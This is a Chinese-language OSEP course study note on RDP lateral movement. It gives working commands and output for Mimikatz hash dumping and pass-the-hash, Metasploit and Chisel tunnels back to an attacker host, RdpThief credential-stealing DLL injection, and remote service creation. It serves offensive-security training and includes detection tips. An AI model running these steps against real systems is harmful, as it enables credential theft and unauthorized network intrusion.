---
title: OSEP-14-RDP横向移动与隧道技术
description: '14-横向移动 | 02-RDP横向移动与隧道技术'
pubDate: 2026-01-30T00:02:17+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Active Directory
  - Lateral Movement
---

# Windows横向移动 - RDP与隧道技术

## 概述

本文介绍Windows环境中的横向移动技术,重点讲解RDP的各种利用方式和隧道技术。

---

## 第一部分:RDP基础横向移动

### 1.1 标准RDP连接

使用明文凭据进行RDP连接:

```cmd
mstsc.exe /v:appsrv01
```

### 1.2 RDP凭据缓存问题

RDP连接后,NTLM哈希会缓存在目标机器的LSASS中:

```cmd
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 2225141 (00000000:0021f3f5)
Session           : RemoteInteractive from 2
User Name         : dave
Domain            : corp1
        msv :
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
```

**安全问题:** 简单断开连接不会清除缓存,必须正确注销!

---

## 第二部分:受限管理模式(Restricted Admin Mode)

### 2.1 什么是受限管理模式?

- 使用网络登录而非交互式登录
- 不需要明文密码
- 不会在目标机器缓存凭据
- 支持Pass-the-Hash

### 2.2 启用受限管理模式

```powershell
# 创建注册表项
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

### 2.3 使用受限管理模式连接

```cmd
mstsc.exe /restrictedadmin
```

### 2.4 验证凭据未被缓存

```cmd
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 2225141 (00000000:0021f3f5)
Session           : RemoteInteractive from 2
User Name         : dave
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
```

**注意:** msv部分为空,说明没有缓存NTLM哈希

---

## 第三部分:Pass-the-Hash RDP

### 3.1 使用Mimikatz进行PTH

```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
user    : admin
domain  : corp1
program : mstsc.exe /restrictedadmin
NTLM    : 2892d26cdf84d7a70e2eb3b9f05c425e
  |  PID  9500
```

### 3.2 使用xfreerdp进行PTH

从Kali直接使用哈希连接:

```bash
xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
```

### 3.3 远程启用受限管理模式

如果目标未启用受限管理模式,可以通过PTH启用:

```cmd
# 1. 使用PTH启动PowerShell
mimikatz # sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell

# 2. 远程连接并启用
PS> Enter-PSSession -Computer appsrv01
[appsrv01]: PS> New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

---

## 第四部分:Metasploit反向隧道

### 4.1 场景说明

当目标在NAT/防火墙后面时,无法直接RDP连接。需要通过已建立的Meterpreter会话创建反向隧道。

### 4.2 配置Autoroute

```
msf5 > use multi/manage/autoroute
msf5 post(multi/manage/autoroute) > set session 1
msf5 post(multi/manage/autoroute) > exploit

[+] Route added to subnet 192.168.120.0/255.255.255.0
```

### 4.3 启动SOCKS代理

```
msf5 > use auxiliary/server/socks4a
msf5 auxiliary(server/socks4a) > set srvhost 127.0.0.1
msf5 auxiliary(server/socks4a) > exploit -j

[*] Starting the socks4a proxy server
```

### 4.4 配置Proxychains

```bash
# 添加SOCKS代理到配置文件
sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'
```

### 4.5 通过隧道连接RDP

```bash
proxychains rdesktop 192.168.120.10
```

---

## 第五部分:Chisel隧道

### 5.1 什么是Chisel?

- 开源隧道工具,用Golang编写
- 通过HTTP传输数据,SSH加密
- 包含客户端和服务端组件
- 创建SOCKS兼容代理

### 5.2 编译Chisel

**Linux版本:**
```bash
cd chisel/
go build
```

**Windows版本:**
```bash
env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
```

### 5.3 启动Chisel服务端(Kali)

```bash
./chisel server -p 8080 --socks5
```

### 5.4 启动Chisel客户端(Windows)

```cmd
chisel.exe client 192.168.119.120:8080 socks
```

### 5.5 配置Proxychains使用Chisel

```bash
# 编辑/etc/proxychains.conf
socks5 127.0.0.1 1080
```

### 5.6 通过Chisel隧道连接

```bash
proxychains rdesktop 192.168.120.10
```

---

## 第六部分:RDP凭据窃取

### 6.1 RdpThief概述

RdpThief是一个DLL,可以注入到mstsc.exe进程中,钩住凭据处理函数来窃取明文密码。

### 6.2 工作原理

```
mstsc.exe
    ↓
加载RdpThief.dll
    ↓
钩住CredIsMarshaledCredentialW
钩住CryptProtectMemory
钩住SspiPrepareForCredRead
    ↓
捕获明文凭据
    ↓
写入文件
```

### 6.3 使用方法

**步骤1: 编译RdpThief**

使用Visual Studio编译RdpThief项目

**步骤2: 注入DLL**

```cmd
# 找到mstsc.exe进程ID
tasklist | findstr mstsc

# 使用注入工具注入DLL
inject.exe <pid> RdpThief.dll
```

**步骤3: 等待用户输入凭据**

当用户在RDP对话框中输入凭据时,会被捕获

**步骤4: 读取捕获的凭据**

```cmd
type C:\Users\Public\creds.txt
```

---

## 第七部分:无文件横向移动

### 7.1 使用服务控制管理器(SCM)

```csharp
// 打开远程SCM
IntPtr SCMHandle = OpenSCManager("appsrv01", null, 0xF003F);

// 创建服务
IntPtr schService = CreateService(
    SCMHandle,
    "MyService",
    "MyService",
    0xF01FF,
    0x10,  // SERVICE_WIN32_OWN_PROCESS
    0x3,   // SERVICE_DEMAND_START
    0x1,   // SERVICE_ERROR_NORMAL
    "C:\\Windows\\System32\\notepad.exe",
    null, null, null, null, null);

// 启动服务
StartService(schService, 0, null);
```

### 7.2 优势

- 不需要在目标上放置文件
- 使用合法的Windows API
- 可以执行任意命令

---

## 常见问题

### Q1: 受限管理模式有什么限制?

- 无法访问网络资源(因为是网络登录)
- 需要目标启用此功能
- 某些应用可能无法正常工作

### Q2: 如何检测RDP横向移动?

- 监控事件ID 4624(登录类型10)
- 检查异常的RDP连接源
- 监控mstsc.exe进程

### Q3: Chisel vs Metasploit隧道?

| 特性 | Chisel | Metasploit |
|------|--------|------------|
| 独立性 | 独立工具 | 需要Meterpreter |
| 检测 | 较难检测 | 可能被检测 |
| 功能 | 仅隧道 | 完整框架 |

---

## 练习

1. 使用标准RDP连接并验证凭据缓存
2. 启用受限管理模式并验证凭据未缓存
3. 使用Mimikatz进行Pass-the-Hash RDP
4. 配置Metasploit反向隧道
5. 编译并使用Chisel建立隧道
